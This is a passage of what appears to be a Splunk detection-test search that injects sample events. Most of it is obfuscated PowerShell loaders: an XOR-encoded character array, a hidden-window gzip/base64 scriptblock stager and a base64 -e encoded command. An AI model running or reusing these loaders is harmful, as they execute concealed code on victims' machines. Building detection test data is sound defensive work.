,94,82 , 84 , 118,37 ,41 , 112,68,81, 37 ,95,46, 37 ,77 ,78,111,121 , 120,41 , 115 ,119,75 ,88 ,85 , 104, 100,54 ,50, 86 ,123 , 78,46,87,43 ,85, 122, 89 ,36 ,46,120,71,78 , 117, 54 ,71 ,122 , 90 , 108 , 94 ,114,46 , 81, 44,112, 117 ,82,50,92,37,126 , 114 ,103,40,104, 81 , 82, 85 ,89 ,115, 87, 54 , 110,50, 87 , 91 ,126 ,71 ,123 , 119, 37, 113 ,74 ,81,115, 106, 107 ,123 ,95,87, 108,117, 111 ,84, 76 , 71,124 ,90 ,45, 79,110 ,90 , 123 ,89, 50, 118 , 124 ,104 , 85 ,104, 42 ,116 , 75 , 123 ,84, 107, 94 ,115 , 83,77, 91,119 ,82 , 54 ,123, 42, 78 ,109 ,95 , 75,68 ,122,79 , 90,124, 83 ,116,77 ,45, 116 ,100,126 ,110,100,117 ,95,40,121 ,121,50 , 41 , 115,83 , 79,120 , 54,82,80 ,108,42 , 37 ,72 ,79,83 ,47, 41,111 , 119, 100 ,69 , 37 , 91 , 103, 110,54 ,88, 108,37 , 81 ,85 ,103 , 127, 120, 94 ,46 ,126,113, 76, 107 , 69, 42 , 80 ,115,82, 46, 103,124 , 87,42 , 79,122 ,114 ,100 ,105 , 42 ,50,104, 117 ,109 ,68, 71 , 83 ,114, 120, 68,113 , 83 ,77 ,126 , 47,46 ,36,113 , 107 , 94 , 113 , 103,47,86 ,90,73 , 92 , 123,113,120 ,89, 103 , 120,100, 90 , 78, 106, 110 , 44, 78, 37 ,107,118,92, 90,120,45, 74,115 ,112,92, 85, 43 , 37 ,119, 80, 127,40 , 36 , 111 , 41, 115 , 71 ,120 , 40 , 90 , 83,123, 75, 84 , 120,41 ,101 ,74, 92,72 ,109,72 , 123 , 42, 79, 112 , 88, 110 ,80, 78 ,45 ,69,95 , 90 , 100, 88,69 , 37 ,81,107 , 110 ,84,72,46 , 107, 73,78 ,122 ,103, 121 ,86, 82,54,113 , 113, 71, 43, 45 ,40 , 42,105 , 110, 44,103 , 104 , 82 , 75 ,114,126 ,75 ,41, 113 , 87,92, 115, 74 , 104 ,75,106, 118,75, 124,76 ,41 ,100, 108,118 ,73 , 69 ,116 , 54, 46, 111, 108,47,43 , 94, 50,69 ,101,71, 50, 80 ,123, 126 , 72, 120 ,87,122, 74,36 ,121 , 116, 123, 95 , 77,46,74 ,107, 41 ,88, 45 , 108 ,107,108 ,115, 104,36,95 ,101, 78, 76 , 43 ,79, 95 ,121,122 ,112,86,118 , 95, 45 , 112 , 46 ,83 , 100 ,75, 94,109, 88 ,111 , 101 ,105, 84 ,94 , 71, 75 ,127 , 120 ,105 , 112 ,76, 107,91 , 73,73, 85, 108,124 , 41 ,45 ,89 , 87,122, 124, 76 , 89, 101, 92, 79 ,82 , 80 ,116 ,101, 72, 115,82, 75 ,80,71 ,91 , 73,50,77 ,73 ,50 ,86,119, 100 ,111 ,94, 122, 117,110 , 41, 100 , 92 ,69,108, 107 ,92 , 107,44 ,85 , 126 ,47 ,94 , 115, 115 ,82 , 105 , 108, 89 , 103 ,121,83, 92 , 110 , 71,101 , 123,36 ,122,36, 108, 44, 82,81,118 , 74 , 79 , 68 , 69,72, 89,43,68,77 ,79 ,118 , 92 ,94,108,41,54, 80, 108, 110 ,127,92 , 119, 89,85, 47,105, 74 ,77, 45,109, 37 ,123 , 41 ,46, 37, 46 ,40 ,110 , 80 , 73 ,54 ,68, 47 , 68, 107,76 ,83,71,94 ,113, 107, 95, 95,123,112, 95,79 , 115,40 , 71 ,87, 73,43,105 , 115 ,113 , 37 , 107, 72,121, 100,101 , 100 , 40, 94, 92 , 83,108 ,50 ,126 ,117 , 46,90 , 78 ,44 , 90 , 103,127,108 ,124 , 105, 42, 91, 78 ,118,74 , 41 , 115 , 114, 71 , 94 ,82 , 121 ,105 ,83 , 112 ,83,82 , 92,82,123, 73, 42 , 118 , 104 , 79,118 , 37, 95 , 46 ,119 ,114, 110 ,80, 36, 87,118 , 108 ,122, 88,119 , 94, 81,109, 69,89,86,120 , 37 ,86,79, 114 , 94 , 105, 80 , 47, 74 , 45, 54,82 ,116, 71 , 89 , 80,90, 87 ,81,104 ,118, 45,95 , 46 ,89 , 122 , 120, 126 , 86, 79,103, 90 , 50,114 ,109, 86, 46 ,89,109 , 113,95 , 80 ,87, 95, 117 ,111,82 , 41 , 91, 123 ,84 , 101,86, 101 , 103 , 68 ,81,113,37 ,81,50 ,69 ,42 , 73,110,119 , 105, 69 , 82 ,79,123 ,54 ,43, 120 , 71 ,84,127 ,71, 71 , 94 , 107,42,72, 71, 36 ,82 , 107 ,37, 84, 104 , 40 ,115,36 , 81,101 ,106 ,68,77 ,109, 117 ,111, 54 ,77,89 , 54,118,118, 41,36 , 85 , 106 ,79, 54,83 ,111, 83 ,106, 90 , 82, 82 ,79 ,117,44,101 , 68 ,117, 80 , 105 ,87,123, 44 , 84,41 , 103 ,127 ,78 ,111 ,91 , 80,43 ,69 , 91, 79 , 72 , 118,117 , 114 , 110 ,72, 113,113 , 124 , 126 ,84,90,110 , 120, 114 , 124 , 45,114, 124 ,71 , 36, 72 ,73,42, 69 ,72, 107 , 92,87, 50 , 91, 87, 109, 69 ,116 , 88, 83 , 120 , 83,78 , 73 ,76,103,46 ,42 , 80, 42 , 45 , 73, 117, 46, 103 ,112, 81, 47 ,86 , 118 , 72,77 ,121 , 88, 72, 120, 89, 91 ,75,90, 44,68, 105 , 109, 89,86 , 79, 40,46, 88, 71 , 95, 116 ,121 , 85 ,69,108,100, 77,108 ,121 , 117 , 90 ,50, 119,113 , 82 ,112, 95, 100,72 , 105, 82, 79, 72, 112,37, 124,87 , 46,46, 71 , 77 ,54, 109, 81, 74,72, 111,40 , 113 , 73 ,106,92 , 85,74 ,85 , 100 ,127,83 ,75,40,74, 123, 87 ,77 ,46 ,71 ,46 ,76 , 119 , 91 ,117 ,75 , 83 , 126 ,42, 108, 42,88,78 , 109 ,44,83,114 ,40 , 124,88, 104, 36, 41,101 , 44 , 103 , 50,124, 109 ,101 , 82, 117, 111, 103 ,120 , 94 ,103,82 , 37 , 84, 108, 120, 124, 90, 41 ,36 , 73,127, 47 , 112, 86, 104 , 100 , 88, 118 ,43,76,85, 120,81,88 , 72 ,112,40, 90 ,74, 36 , 122, 81 , 87, 79, 117 ,107,90 ,101 , 87 , 113,126 ,72, 75 , 109 , 127,68 , 114 , 120 , 89, 83, 68 ,121 , 77 ,109,86, 114,108,108 ,76 ,91 , 43 ,85, 69 , 42,90,89,118, 90,107,44 ,101,104 , 83 , 106 , 92, 120, 105, 45 ,75, 50 ,105 , 88 ,73,45,71 , 77 , 110, 105, 115, 115,74,68 ,118, 77 , 68, 45 , 88 , 37,90 , 80 , 100,127 , 83 , 114 ,122, 104 , 41 ,44 , 85,83,87,100 , 103 , 92 ,103 , 91,37 ,69,110 , 124 ,42,73,116 ,81,81 ,108,41, 45 , 117,100,106 ,104, 47,113, 113, 92 , 121,79 ,119 ,83,77, 114 ,124,86,106 ,118,126 , 120, 107,108,123 ,82,40,47 ,73,69 ,69, 73, 40 , 122, 72 ,100 ,123 , 42 ,43,101 , 87 ,108 , 42,71 ,126 , 82 , 83, 44,44 ,82,117,81 ,119, 106 ,109 , 42,115 , 89, 75 , 72 ,44 , 75 , 118 , 43, 107 ,72 ,115 , 114 , 78, 45 , 81,113, 89,76 , 103 , 75 , 124, 108,44 ,111 ,37,116,73 , 118,74 ,116,88,105 , 79,108 , 44,85, 76 ,120 ,75,105,119 , 84,40, 47, 46 ,87,105 , 103 , 108 , 45 , 75, 44, 117 , 72 ,40 ,71 , 72 , 37 ,105, 95 ,44,80, 40, 112 ,123 ,74,121 ,41 , 68 ,103 ,110 ,36 ,91 , 117, 112 ,87 , 69, 77,85 , 118 ,74 , 79,92,119, 95,73,100 , 83 ,87 ,36 , 46, 71,74,106, 126 , 79, 106 , 105, 74 ,88, 75,71,121, 74 ,114 , 118 , 83 , 71 , 111 , 41, 126,121, 90, 75,43 ,77,122, 50 , 41 ,119 , 87 , 121,113 , 109 , 119 , 87, 46,110,105 ,119,40, 68 ,111 , 42 , 112, 105, 122,81 , 106, 54, 104 ,100,80 , 89 , 92 , 73 , 91, 118, 107 , 123 ,86, 115,117 , 91,112,107,69 , 114,122,105, 85 ,94, 36,71 ,43,75, 80,77 , 106 , 109 , 118 ,116, 69,36 ,108 , 80 ,89, 108, 119 , 84 ,47,108 , 91, 86, 112 ,118, 113 , 42 ,91,79 ,84, 104 , 79 , 88, 120 ,90 ,73, 109 ,79 , 101 , 45, 90 , 46 ,110 , 44, 103, 72 ,89, 77 ,83, 87 , 41,100,112, 108,104 , 43 , 47 , 107,117 ,71 , 88, 100,108, 77, 121 ,37, 117, 121 ,101,127 , 118 ,103 ,74 , 69,81 ,109, 100 , 101, 124 ,127,116,78,82,74, 75,43 ,37 , 118,119,72, 117 , 107 ,110, 115, 121 , 115 ,44 ,114 ,127,50,123, 37, 86, 109 , 45 ,43 ,103,113,117, 124, 116 ,74, 115 , 124,119, 73,120,81, 106 ,68 , 100,115 , 89 , 107 , 46 ,101,119, 86 ,71 ,74 , 108 ,43, 80 ,41 , 73, 78, 111,79, 104 , 81 ,74 , 110, 92 , 84,116,105 ,101, 69 ,118, 124,118 ,40, 46,74,112 , 89,112, 81,92 , 109, 83 ,122,113 ,105,113 ,105 ,90,43 ,79 ,114 , 105, 46, 116 ,113,44 , 44,119,109, 89 ,113, 120 , 103 ,122,90,41 , 43 ,83, 95, 115 , 74, 42 , 111, 74 , 120, 81 , 120, 109,40 ,100, 68 ,103 , 127, 54,115, 86, 101, 121 ,69 ,123,119 , 72 ,124,87, 105,47, 127, 109,37,74 , 94 ,41 , 112 ,44 , 110 , 94 ,104 , 78 , 71 , 117 , 117 ,47 ,117 , 88 ,75,105 ,103 , 124 ,116,103,72 , 43, 74, 94,73 ,50 ,112 , 42 , 88,91 , 36 , 84 ,127 ,116 ,75 , 74 , 118 ,83,75 , 117, 124 , 77, 124, 115,75 , 109 , 84, 108, 73, 120,47 , 82 ,119 ,46 ,123 , 103,79 ,77, 72,83, 47 , 111,124 ,119 , 95, 109 , 85 ,112 , 119 ,83,80,95, 84 ,54 ,104,77,47, 47 , 120,71,112, 109, 41 ,91 ,95,124,36 , 41, 123 , 122 ,109,111, 104,45,117 , 89,36 , 73 ,82, 54 , 83 , 113,124 ,76 ,116,42 ,104 ,115 , 79,46 ,118 , 37, 79,113, 100, 74, 114, 87 , 115,87 , 36,94, 86 , 117, 82, 111 , 90, 37,76 ,76 ,40, 91 ,114,105,54 , 75 ,116 , 110 ,42, 41 ,79,94,118,54 , 119 ,89 ,116, 89, 94, 42, 120,121 ,74,90 ,107, 37 , 106, 105, 109 ,105,85 ,118, 82, 119,37,124, 40,91,116 , 73 , 100 , 110,108 ,91 , 71 , 120 ,100 , 85 ,109 , 76 , 68, 44, 107,95, 108 , 119 ,94, 78,116, 91, 104, 43 ,73, 79 , 46 , 118, 117 ,69 , 85 ,90,126 , 103 ,115,101 ,101,118, 42,103 , 47 ,114,101,111 , 103,110, 111 ,43 , 44 ,43 , 112,85, 37 , 88 , 37 , 126 ,110, 111,104,54 , 85 ,37 ,79, 37,77 ,50 ,122 ,68,82,86,36 , 77 , 45 , 91,69,122,114 , 124, 69, 115 , 75 ,126,108 , 40,74,101 , 82 ,120 , 85,50 , 103 , 126 ,115 , 36 ,43 , 107, 126, 44 ,44 ,42, 50,104, 85 , 103, 76, 112 ,118 , 45 ,68, 47 ,110 , 44,54,75 ,107 , 89,105 , 108 , 85 , 89 ,107, 120 , 111 ,68 , 74,112 ,118 ,79 ,123 , 91 , 74 , 126, 43,89,103,106, 126,95 ,103, 104, 43,42 ,43, 123,105 ,78, 50 , 119 , 116 ,45 , 73 , 46, 37 ,41 ,41 ,78,108,69 ,77,87,54, 45 ,36 , 116, 119 , 103 ,118 , 106,95 ,76 , 86 ,126 , 54, 108 ,105,100, 69 , 126,121, 101,36, 120, 103 , 76 ,120,110 ,69 ,88 , 106 , 54,80 ,123, 71,121 , 117 , 42,95,72, 104,110 ,103,118,110, 43 ,121,108, 115, 108, 103 ,81 , 101 , 73 , 122, 119 ,73,44 ,126 ,74, 115, 73 ,74 , 86 , 124 , 54 ,73 , 95,100, 36,123 , 92,47, 118 ,36, 45,84, 107, 46, 101, 71 ,122 , 46 , 107, 75,89,100 ,95,86 , 100 ,81 , 77 ,106 , 105, 118 ,108 , 76,87 , 40 , 114,118, 100, 120 ,100 ,50, 73 ,109, 68 , 81,107 , 106 ,36 ,81 , 103 ,106, 50 , 78 ,45,111 , 104 , 41 , 124 , 119 , 124,80,123,127,89 ,118 ,114 , 100 ,68 , 115, 44,44,78, 54 , 114,117,37, 113, 115 , 114 , 107 , 54 , 119 ,106 , 85, 41,76, 120 ,113, 50, 117, 103, 68,89 ,81,40,50,115,46,108 ,85 ,81,89, 123 , 114, 126, 111, 46, 86,117 , 54, 88 ,120,117,84 , 87 ,119, 88,117, 50, 77 ,68, 77 , 110 ,77, 69,94 ,122 ,108, 87 , 121 , 109,40 , 42 ,80 ,121 , 68 , 116, 50 , 81,89 ,103, 83, 50, 95 ,109 ,118 ,36,50 , 75, 109 , 69,104, 105,73,92, 119, 126 ,118 ,111 , 119 , 69 ,116,82 , 50, 88, 92, 42, 119,69 ,119 ,120,118 ,124, 123 , 83 , 36, 88,75,109, 87,121,46, 80, 73,113,126, 54, 45 ,127 ,126 , 121,73,110 ,94 ,54 , 80 ,46, 76,118,88 ,43, 122,115, 85,42 , 76 , 123 ,76,46,118,86, 72,84 , 40,108 , 36 , 80, 121 ,94 ,41,118, 84,41,124 ,103,107 , 106, 91 , 90 ,119 ,40 , 71 ,100, 50 ,106 , 45,92 ,92, 92 ,32 , 32, 63 ,52 ,52 ,38, 84 ,88,69 ,61,53 ,83,120 ,106, 48,82 , 127,119 ,120,126 ,105 ,61, 84 , 82, 51, 78, 105 ,111 ,120 ,124 , 112,79, 120,124 , 121 ,120 ,111, 53 , 83,120,106,48,82 ,127,119 ,120 , 126 ,105, 61 , 84 ,82, 51 , 94, 114, 112 , 109 , 111 , 120, 110,110, 116 ,114 , 115, 51 ,90, 103 , 116,109, 78,105,111 , 120 ,124, 112, 53 ,57 ,110 , 49, 70 , 84, 82 ,51,94 ,114 ,112 , 109, 111,120 ,110 ,110, 116 ,114 ,115, 51,94,114 , 112,109,111,120 ,110 ,110 , 116 , 114, 115, 80,114,121,120,64, 39 ,39 ,89, 120, 126,114,112 , 109 ,111, 120, 110, 110, 52 , 52,52 ,51 ,79, 120, 124 , 121, 73 , 114,88, 115 , 121,53, 52,38)|% { [cHar] ( $_ -bxOR'0x1D' ) } )))" ]
| append [ | makeresults | eval src="compromised6", command="-nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKGxhF0CA7VWbW/aSBD+nEj5D1aFhK0QjANt2kiVbs2rCU4g5jUcihZ7bW9Ye8FeE6DX/35jwGmqpnftSWflZb07MzvzzDMzdpPQFpSH0m4gfTk7PeniCAeSnFuxzk1YkHJJMmoqJydwkuOa/8ikz5I8RctljQeYhrPr62oSRSQUh/dikwgUxySYM0piWZH+kkY+icjF3fyJ2EL6IuUei03G55gdxbZVbPtEukChk551uI1Td4rWklEh5//8M69ML7RZsb5KMIvlvLWNBQmKDmN5RfqqpBf2t0si501qRzzmriiOaFi+LA7CGLvkFqytiUmEz504r0AY8BMRkUShdAgotXA4l/Ow7EbcRo4TkTjOF6Rpans6m/0hT48X3yehoAEpGqEgEV9aJFpTm8TFFg4dRu6JOwMtS0Q09GaKAmJrviByLkwYK0i/Y0a+Jc8ZbL+qJL9WAqmuiJQCJPOtQE3uJIwcVPNveHpggAJPxgJA7+vZ6dmpm1Em4HevOQOrk+l+TcA/uctjuhf7LJUKkgkXYcGjLbzm+lFClNkLulJuUesVfq6uZbIg6U8aHLamQ06dGagcU5rzHzd+Mz34OTdrxKUhqW1DHFA7o5/8Fs7EZWQfYjETuwWv5PzxgDg1woiHRQpcmu4f1OoBFS+6ekKZQyJkQ65i8ArSqHzvzCEXct4ITRIARod34F/OBdKTTPpI9G12e/oOQvkqw3FckLoJVJ1dkCyCGXEKEgpjejxCieD7Zf6bu2bCBLVxLDJzM+UFyOOFVR7GIkpsyBsE37eWxKaYpVgUpBZ1iL61qJddnH8TiSpmDGoBLK0hE7CTImCJlA0R+JhmXilaRBjBkpEARPbl32DYg2I/En7PHuwRJ/+DhxmhD+xNwchQeOUfZNhiXBSkIY0EtJEU2JRH/+n6V/3j4Eg1IsdcyFmFTPWtSImdi+dGyskjLHsQIgEANCIe6DgmHyqHViG/U+9oFcEzMUJm2vqCauiZaoYJvwNaNnjtyrlpP7XUqLbxXWTEhtnq1nqtVmXdtoYVYdUNcdM1hFkfPz1ZqHU/mIgHA7X6tLSYVHbLNt1ZHeRMNuqHnb57Lumb3ZPnuJOa63pXrnWvvW/Qzqja00uXuFOrJ52R/qyXKnGdPrd6dNBbtBtiPhkyPHBVb6x9wnTTiZ6GGjd3BkJNv2zv2u6w6ZvOdtKi5EktdWgP9RC6se8Hg6a39JoxUj8NV2jk3XQZ+oCRgYxu0n7P9N6goaNBXe/hO94tn9dU7cFZ1RsPY9wOmNNsqdpkjBwUqX3P167u/DDFCXv6Sk9lUOdh21BBpltBrcol3T2sek0P1UFmGHCEG3QxOB+Dzds+6IwGmsORCI2xqg491UOu5U8w0kFaX6GGzqvbj12zqw6Hl742X2g++EzG649mG5037K6qqufBHP6qyDaXm3CsP1+tvZbFb/ANHq4fyqrWf266aIXOz3VNn4tWvdxew7199dPg87uUP0CgHF5XX9HiZ23dxFHsYwZ0gXadFWmDR41j/+1ymmrIMozuBYlCwmDswWDMaI4Y43ba/9M+DaPnMBDS+TSAZfnyzZUivQgq36ZCtnV9/QAuQt0AsYsdEnrCL5Q25VIJOnxpUylBgL8eVZUvt3JqqZAOiBSUo2G2N6yklZQjj/b/CdWxeH345/wLVN/2/uH0l+ArFfbB/rD7/cZvYfmbYY8wFSBnQeth5DD83oz+yIlXnweQD8i4e3zSD7y7RFzcwkfD2enfVlAYhUwKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);" ]
| append [ | makeresults | eval src="compromised6", command="-nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBJAG0AYwByAEYAMABDAEEANwBWAFcAYgBXAC8AaQBPAEIARAArADMARQByADkARAA5AEUASwBLAFkAawAyADUAYQBYAHQAYgByAFcAVgBLAHAAMQA1AEQAMAB0AGEAYQBBAHEAVQBjAHUAagBrAEoAawA0AHcATwBEAEYAMQBuAFAASwB5AHQALwAvADkAeABwAEMAMAAzAGQAdgB1AGEAdgBlAGsAaQAwAEEANAA5AHMAeAA0ADUAbgBrAGUAagB3AG4AUwAyAEoATwBVAHgANQBvAFEAMgBwAGUAagB3ADQATQBlAEYAagBqAFMAagBNAEoATQBoAEoAWgBXAEUASwBQAEYAbwBtADAAZQBIAE0AQgBDADQAZABIAFIATABqAFYAagBnAHAAYgBMAE8AbwA4AHcAagBhAGMAWABGADcAVgBVAEMAQgBMAEwALwBYAHUAeABSAFMAUgBLAEUAaABJADkATQBFAG8AUwB3ADkAVAArADEAawBZAHoASQBzAGoAeAA5AGMATwBjAGUARgBMADcAbwBoAFgAKwBLAHIAWQBZAGYAOABBAHMATQA5AHYAVQBzAEQAYwBqADIAagBHAEsAZgBiAFgAVwA1AFIANQBXAHEAUgBUAGQASgBhAFAAUwAwAFAALwA4AFUAegBjAG4AeAA1AFYAcABzAGYARwBZAFkAcABZAFkAdQByAHQASgBKAEkAbQBLAFAAbQBPADYAcQBYADAAMQAxAFkAYQAzAG0AeQBVAHgAZABJAGQANgBnAGkAYwA4AGsATQBVAFIAagBVADkAUABpAG8ATQA0AHcAUQBHADUAZwBtAGgAUAB4AEMARgB5AHgAdgAxAEUATgA2AEUARwArAEEAZwBpAFUAeABGAHIAVQBJADEAeQAzAHkAOABhAE8AZwB4ADcAZwBuAHYASQA5AHcAVgBKAEUAdAAzAFMASgBpAHIAdwBaAEQAcgA5AHcANQBoAGsAdQA5ADYAawBzAGEAUQBSAEsAZABxAHgASgBJAEkAdgBYAFMASwBlAHEARQBlAFMAWQBoAHYASABQAGkATQAzAEoASgBpAEMAbAB5AHMARgBqAGMATwBwAGEAWQBMAFoARQAxADgAUQBvAHgAQwBuAGoARgBuAGEANwA0AFEAeAByAHMAZwBxAHgAKwB4AFgAbgBZAHoAWABUAG0ARABWAGsAOABLADAAZwBNAFgAdgBxAG4AUwA0AG4AegBLAHkAOQA5AFAAZgBTAEYAUAB4AGIAcwBMAHoAegBEADMAQQA5AHYAWABvADgATwBnAHcAeQBIAFUAeQAzADcANwBXAEMAWQB3AE8ASgByAHMAeABnAGQAUwBNAEgAawAvAG8AegB1AHAAUwBLADEAdQBhAEEAOQB0AGcAeQBjAFUARwBYAGcAdQAzAEkAaQBYAG0AOQBCAGwAWQByAGIAQQBvAFcAegAvADIAcgB1AFMAbQBZAEwAagB1AGYATwB4AHMAWQBXADQAeQA1AE4AUwBmAGcAawA5AEcAWgBZAEUARgB1ACsAawBmAEsANwBKAE8AQQBoAHEAVAArAGkAYgBHAEUAZgBWAHkAMABSAGwAdgBBAFUAdwBDAFIAbgBiADEARgBYAE8AegBLADAAagBLADAATABNAEYANAB0AGMASgBJAHkARwBXAEMAagBUAEYAOAAzAGQAdQBqAFkAagBLAFoAOQA5AHEAUwBwAGwAUABCAFAASwBBAHAAQQBTAHkAQQB2ADcATQBiADUAUABaADgAMgBEAG8AZAB1AHkAUQBDAEIARABhAHYANABQAHcAQwBnAEYASQBuAGUAVABXAG0AYgB3ADMAKwBlADcAcQBIAFkAegAwAEcAcwBOAEoAWQBtAG0AOQBGAE0ANgBhAFoAMgBrAHUAdwBZAHoANABsAG8AYgBpAGgARwBaAEwASwBKAFYAOABOADkAUgBmADAAbgBWAFMASgBxAG0ASABFADUAbQBIAG0ANQBvAFoAagBOAGwAMgBOAFIANABuAFUAcQBRAGUAYwBBAGEAbAAzADcAcABMADQAbABIAE0ARgBCAEsAVwAxAHEAWQArAHEAVwA1AGMARwB1AGIAYgA2AG0ALwBpAFUATQBPAE0AdwBSAEcAQQBTAEUALwBBAEEAOAB5AG8AKwBsADIAcABsAEMAQQBnAFEAMgBEAGQATABMAHAARQAyAHQARwBTAGsAUQBnAHMAZABpAGUAKwB5AFgAQQBJADUAegB1AFQAKwBVADQANABPAEMAUwArAC8AcQAvADAAYwBoADMAdgBSAGEAdAB3AHkAQQBGADQAbABSAHkAUQA2AHoASQB1AEwAVwAxAEkAaABZAFMAKwBvAFQARABkAEsAZQBpAC8AYgBQADYAcQBZAGEAZwAwAGEAbwBKAGsASgBCAGoANQB1AFoAaABVAE4AMQBMAHAAdQBiAEEANAA4AFoAVQBZAE0AMABSADIAOQBRAHMASgB0AFQAYwBGAGoANgBvADQASQBSAC8AUAA5AHMAMwBCAGUARgBlADYAcABqAFUARQB6ADkAaQBPAG0AZQBOAFYARgA3AFMAQwBWAHIAUgBpAE8ALwBBAGQAMABGAE8AYgAxADgALwA5AHoANQAxADUAdQB5AFQAcQA2ADEAbQBBADcATQBSADIAMgByADEANgB2ADkAMAArAGUAKwBxADQAdwB6AFAAcABOAG0AegA1AHUAVwBkAEwAcAAzAEUAMwBuADcAdQBvAGYAVABNAFkAeQAzAHMAYgB0AFcAOQBwAGUAVABFACsAMgB5ADQANwBkAE8AdAAyAGsAVAA5AGUAbAB6ADUAdQBxADkAdABWAHUAYgByAGUAegBrAE0ALwBHAE4AZQBEAEkARAB3AFAAMwBKAHYASwBoAHkAYgB0AGoAbQByADkAYQB2AGsARQBkACsAdQBOAHQARAB1AHEAcgBxAHIAbABzADYAUgBCAFYAKwAwACsASABmAFEAWABuAGEAWgA4AEcAQQA4AFoASABnAFMAbAA4AEsANwB5AEMAZABOADEAVgA4AHkASABGAGUANQBzAGIAWQBSAGEAcwAxAE4AdgAyAHcAbQBHAHIAWgBuAGoAYgA4AFoAdABTAHUAYQBsAGMAcABmADIAVQBSACsAaAB6ADkANwBOAFkATgBBAEsAbAAyAEUAcgBRAGEAVgBQAHcAOABkAGEAUgBKAE0AVwBsAEkAbQBSAGoAWgBvAFAAMQA1ADAAUAByAE4AbwBmAE4ASwB0AG8AMABLAGoAMgA4AFQAWAB2AG4AYgA2AHYAbAB5AHIAMwAvAG0ATwBqAGUAWAArAEgATwB4AEgAegBXACsAMQBTAFoAWAB5AEgAZgBMAFEAdAAzAFkAYQB6AHkAbgBsAHIAdgBwAEsANABNADEASwB4AFUASQBzADMAaABzAHoAbgBTAE0AYgAyAFgAYQBrADAAcABOAHYANwB4ADMANAByAFIAQQAzAEEAYwBSAGgAeABoAEoAdAAwAE0AWABoAC8AQgAvAEcAdQBiAG4ARgBZAEgAUQAwAHEATAA3AGIASQBjADUAYgByACsAQwA1AGQAcgBTADQAdgAzAHkAbABXAGcAZABiAEMATgBuAHIARgAxAG8ALwA2AHEANABOAEYATQBzAE0ATQBXAEkAVABXAG0AUgArAGEASgBoAGYATgByAEIAbgAyAE8ARgBVAGUAaABnAEcAWAA1ADQASwBJAG0ARABDADQAZgBPAEIANgB5AHIAVwBIAEcATwBPAGUAYQBzAFQAUQBOAE8ARQBLADIARABkAG0AZABVADgATQBZAEgAaAA2ADgAdQBiAEkAMQBKADQATgB6AFoAYwBHAG4AVQA5AGQAWABOAHgARABoAGsAcgBLAEoAMwA2AHgAUwArAEoAUQB6AHEAegB5ACsAcgBSAGMAaABuAFoAYgBYAHAAKwBWAG8AYgB4AGYATAA2AHIARwBsAHgAdABEAFIAYgBKAFUAdAB3AFoASQBzAHIAaABzAEYAOQBkAFUAOABpADcANAA1AC8AagAvAEIAQwBvADcAVQBUAFAANAA4AFgAOABPADEATQB2AGMAVAAxAFoALwBDAGIAeQB5AHAAVQByADkAYgB2AEwAYgBpAGQAOABDADgAagBlAEwASABtAEUAcQB3AGMANgBGAGIAcwBEAEkALwBpAEoANgBxAC8AWgBNAEQANgA5AHUAYQBTAEEARAAyAEEANgB5AFIALwAzAEQAdQBrADcAbAA4AFIAWABjADMAVQBlAEgALwB3AEQAUAA5AEQAUQBHAHkAUQBrAEEAQQBBAD0APQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBh